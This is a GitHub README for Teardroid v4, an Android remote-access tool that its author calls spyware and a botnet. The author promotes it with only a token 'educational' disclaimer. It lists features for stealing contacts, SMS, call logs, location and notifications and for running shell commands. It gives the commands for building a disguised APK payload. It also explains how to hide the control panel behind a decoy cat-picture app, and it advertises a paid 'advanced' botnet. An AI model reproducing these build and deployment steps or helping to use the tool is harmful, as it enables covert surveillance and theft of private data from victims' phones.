### :warning:Disclaimer : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.

# :robot: Teardroid v4

![Screenshot](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)

🇮🇳 It's easy to use android botnet work without port forwarding, vps and android studio

[![GitHub issues](https://img.shields.io/github/issues/ScRiPt1337/Teardroid-phprat)](https://github.com/ScRiPt1337/Teardroid-phprat/issues)
[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/ScRiPt1337/Teardroid-phprat/)
[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/ScRiPt1337/Teardroid-phprat/)

### :rocket: Features

- Retrieve Contact
- Retrieve SMS
- Retrieve running Services
- Retrieve Device Location (:worried: Only work when the app is open on newer devices)
- Retrieve Call Logs
- Run Shell Command ( use findphno command in run shell command to get device phone number and use findx:pdf to find all the pdf files on the device )
- Change Wallpaper
- Send SMS
- Make Call
- Get Installed Apps
- Download File
- Read Notification
- Auto-Start
- Add webview in homepage
- Ignore Battery Optimisation
- Change icon
- ~~Get device admin permission~~

### :warning: Requirement

- Python3
- Java
- Linux or Windows os (we don't support termux use gcloud)
- For android mobile users use github Codespaces

### Java version i used

```bash
$ java -version
openjdk version "11.0.13" 2021-10-19
OpenJDK Runtime Environment (build 11.0.13+8)
OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
```

### Tested on

- Windows 11
- Windows 10
- Manjaro
- Kali linux
- Ubuntu

### Run control panel on deta.space ( recommended for less technical users )
- To get started on https://deta.space, a powerful web application building platform, the first step is to create an account on their website. Once you have successfully signed up and logged in, follow these steps to access the Teardroid v4 control panel app:
- In the same window, open the URL https://deta.space/discovery/r/yz9prb9jw7ku6atg. This link will take you to the HelloKitty app installation page.
- Click the "Install" button to begin the installation process. Wait for the installation to complete and then click on the "Canvas" button.
- You will be taken to the deta.space homepage. Click on the HelloKitty app, which can be found in your panel.
- Initially, the app will display pictures of cats. However, to access the app's login panel, simply add "/v4" to the end of the URL.

By following these steps, you will be able to take full advantage of deta.space's powerful web application building tools and access the HelloKitty app's login panel.

### How to setup the builder ( generate apk payload )

- Clone Teardroid-phprat repo with the following command.

```bash
$ git clone https://github.com/ScRiPt1337/Teardroid-phprat
```

- cd in the Teardroid-phprat directory, then type the command below to install all dependencies

```bash
$ pip install -r requirements.txt
```

- Run the following command to see the options that we can use with the builder.

```bash
$ python Teardroid.py
[+] Checking Python Version
[+] Python Version : 3.10 ✓
  ______                    __           _     __         __ __
 /_  __/__  ____ __________/ /________  (_)___/ /  _   __/ // /
  / / / _ \/ __ `/ ___/ __  / ___/ __ \/ / __  /  | | / / // /_
 / / /  __/ /_/ / /  / /_/ / /  / /_/ / / /_/ /   | |/ /__  __/
/_/  \___/\__,_/_/   \__,_/_/   \____/_/\__,_/    |___/  /_/


Teardroid v4.0 - A tool to build teardroid spyware for Android devices. 🕷
Contact us : https://t.me/script1337 🚀
usage: Teardroid.py [-h] [-v] [-b]

options:
  -h, --help     show this help message and exit
  -v, --version  Version of Teardroid 🥴
  -b , --build   Build Teardroid with custom name [ex: Teardroid.py -b teardroid] 😷
```

- To create an apk execute the following command.

```bash
$ python Teardroid.py -b your_app_name
```

- It will prompt you with your Control Panel url enter your deta space control panel url without /v4 or your own server url (without / at the end of the url).
- You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
- then it ask you to enter the icon folder path so enter the icon folder path
- DONE

### Dashboard

- visit : https://{your server url}/v4/overview
- defualt username/password is : admin/admin

### IMPORTANT NOTICE

- use your own keystore its not recommended to use the defualt keystore you can modify the values in Config.py file to use your own keystore with teardroid v4.

### Screenshot

- ![Builder](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Builder_3oDdS0Tr7.png)

- ![Overview](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)

- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)

### Setup Video

- video : [setup control panel and build apk](https://www.dropbox.com/s/0fz4c8f06gaf5uj/2023-04-26%2013-57-47.mkv?dl=0)

### Need something more advanced try ( scatter alfa )
- If you're looking for a reliable and stable botnet that can meet your advanced needs, I would highly recommend taking a look at Scatter Alfa. Scatter Alfa has been specifically designed to provide advanced functionality and persistence over an extended period of time, making it an ideal choice for users who require persistence and stability.
- [Learn more about scatter alfa](https://github.com/ScRiPt1337/Teardroid-phprat/blob/master/advanced.md)

### Contact info
- for paid project contact me on telegram
- Telegram : https://t.me/script1337
